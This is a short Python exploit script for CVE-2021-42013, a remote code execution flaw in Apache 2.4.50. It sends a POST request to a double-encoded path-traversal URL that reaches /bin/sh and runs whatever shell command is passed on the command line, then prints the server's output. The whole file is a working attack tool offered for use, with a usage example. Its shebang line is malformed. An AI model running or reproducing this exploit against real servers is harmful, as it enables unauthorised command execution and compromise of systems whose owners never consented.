#!/bin/bash env python3

import socket
import urllib.parse
import re
import sys
import art
from colorama import Fore, Style


"""
Apache 2.4.50
CVE-2021-42013
Remote Code Execution
Rewrite by jhonson

"""


def color():
     text="""
               Apache 2.4.50
               CVE-2021-42013
             Remote Code Execution
               Rewrite by jhonson

           """

     
     print(Fore.RED + Style.BRIGHT +text+ Style.RESET_ALL)




def main(parser,socket,url,data,result):

  
    print(Fore.GREEN + Style.BRIGHT +result.replace("'","")+ Style.RESET_ALL)

if  __name__=='__main__':

 try: 

   path='/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
   domain=sys.argv[1]+path
   parser = urllib.parse.urlparse(domain)
   http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   http.connect((parser.hostname, parser.port))
   
   data=f"echo;{sys.argv[2]}"

   req =f"POST {parser.path if parser.path else '/'} HTTP/1.1\r\n" \
               f"Host: {parser.hostname}\r\n" \
               f"Content-Type: application/x-www-form-urlencoded\r\n" \
               f"Content-Length: {len(data)}\r\n" \
               f"\r\n" \
               f"{data}\r\n"
                  
   http.sendall(req.encode())

                    
   
     
   response = b""
   while True:
      part = http.recv(4096)
      if not part:
        break
      response += part

   var=response.decode()
   body = re.sub(r'^.*?\r\n\r\n', '', var, flags=re.DOTALL)
   change=[body.strip().replace('2d\r\n','').replace('\n\r\n0','')]
   final=str(change).replace('[','').replace(']','').replace('2d\r\n', '')
   color()

   main(parser,socket,domain,data, final)

 except IndexError:       
     print('python3 http://exemple.com id')
  
